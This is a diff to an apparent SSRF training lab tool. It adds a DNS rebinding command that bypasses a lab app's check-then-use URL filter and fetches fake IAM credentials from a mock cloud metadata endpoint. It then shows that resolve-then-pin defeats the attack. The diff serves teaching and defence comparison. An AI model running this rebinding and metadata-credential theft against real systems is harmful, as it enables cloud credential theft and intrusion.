@@ -50,10 +50,13 @@ DEFAULTS = {
     "oob": "http://oob-listener.lab",      # OOB callback collector
     "metadata": "http://169.254.169.254",  # mock metadata base
     "metadata_ip": "169.254.169.254",
+    "dns": "http://dns-rebind.lab",        # rebinding DNS control API
+    "rebind_host": "rebind.lab",           # the rebinding hostname
 }
 
 _USE_COLOR = sys.stdout.isatty()
 _PRE_RE = re.compile(r"<pre>(.*?)</pre>", re.S)
+_BLOCK_RE = re.compile(r'<div class="blocked">.*?</b>\s*(.*?)</div>', re.S)
 
 
 def _c(text, code):
@@ -84,6 +87,11 @@ def _app_fetch_url(app_base, level, target):
 
 def _extract_pre(html_text):
     match = _PRE_RE.search(html_text or "")
+    return htmllib.unescape(match.group(1)).strip() if match else ""
+
+
+def _extract_block(html_text):
+    match = _BLOCK_RE.search(html_text or "")
     return htmllib.unescape(match.group(1)).strip() if match else ""
 
 
@@ -183,6 +191,47 @@ def cmd_audit(args):
         print("  => inconclusive (see above).")
 
 
+def cmd_rebind(args):
+    _stage("REBIND", "DNS rebinding — defeats check-then-use (L2.5), but not L3")
+    target = f"http://{args.rebind_host}/latest/meta-data/iam/security-credentials/lab-ec2-demo-role"
+    _get(f"{args.dns}/reset")
+    print(f"Rebinding host: {target}")
+    print("DNS returns a SAFE ip on query #1, then the INTERNAL ip on query #2+.\n")
+
+    # 1) The TOCTOU-vulnerable level: validate (safe) then re-resolve at connect (internal).
+    _s, html = _get(_app_fetch_url(args.app, 25, target))
+    v_toctou = classify(html) if html else "REQ-ERR"
+    pre = _extract_pre(html)
+    print("L2.5 (check-then-use):")
+    if v_toctou == "LOOT":
+        key = re.search(r'"AccessKeyId":\s*"([^"]+)"', pre)
+        print(_c(f"  [+] LOOT via rebind — AccessKeyId={key.group(1) if key else '?'}", "1;32"))
+    else:
+        print(_c(f"  [{v_toctou}] {pre.splitlines()[0] if pre else ''}", "1;33"))
+    print("  DNS flip seen:")
+    for line in _get(f"{args.dns}/log")[1].strip().splitlines():
+        print("    " + line)
+
+    # 2) The correct level: resolve once and pin — never re-resolves.
+    _s2, html2 = _get(_app_fetch_url(args.app, 3, target))
+    v_l3 = classify(html2) if html2 else "REQ-ERR"
+    pre2 = _extract_pre(html2)
+    print("\nL3 (resolve-then-pin):")
+    if v_l3 == "BLOCKED":
+        print(_c(f"  [+] BLOCKED — {_extract_block(html2)}", "1;32"))
+    elif v_l3 == "LOOT":
+        print(_c("  [-] LOOT — unexpected, L3 should pin!", "1;31"))
+    else:
+        print(f"  [{v_l3}] {pre2.splitlines()[0] if pre2 else ''}")
+
+    print("\n  " + "level".ljust(24) + "result vs the rebind attack")
+    print("  " + "-" * 46)
+    print("  " + "L2.5 check-then-use".ljust(24) + v_toctou)
+    print("  " + "L3 resolve-then-pin".ljust(24) + v_l3)
+    print("\n  TTL-0 rebinding beats any filter that re-resolves at connect; L3 resolves")
+    print("  once and pins the IP, so it cannot be rebound. Cf. CVE-2024-24759 (MindsDB).")
+
+
 def cmd_full(args):
     print(_c("\n  SSRFKIT — full kill-chain demo (LAB-ONLY)", "1;35"))
     print("  Reconnaissance -> Weaponization -> Exploitation -> Actions on Objectives")
@@ -209,6 +258,8 @@ def build_parser():
     common.add_argument("--oob", default=DEFAULTS["oob"], help="OOB listener base URL")
     common.add_argument("--metadata", default=DEFAULTS["metadata"], help="metadata base URL")
     common.add_argument("--metadata-ip", default=DEFAULTS["metadata_ip"], help="metadata IP")
+    common.add_argument("--dns", default=DEFAULTS["dns"], help="rebinding DNS control API URL")
+    common.add_argument("--rebind-host", default=DEFAULTS["rebind_host"], help="rebinding hostname")
     common.add_argument("--level", type=int, default=0, choices=[0, 1, 2, 3],
                         help="defense level to use (default 0)")
     common.add_argument("--no-color", action="store_true", help="disable coloured output")
@@ -220,6 +271,7 @@ def build_parser():
         ("exploit", cmd_exploit, "fire payloads at the app (with/without WAF)"),
         ("loot", cmd_loot, "exfiltrate the fake IAM credentials"),
         ("audit", cmd_audit, "check IMDSv1 vs IMDSv2 enforcement"),
+        ("rebind", cmd_rebind, "DNS rebinding: TOCTOU bypass (L2.5) vs L3"),
         ("full", cmd_full, "run the full kill-chain demo"),
     ]:
         sp = sub.add_parser(name, parents=[common], help=help_text)
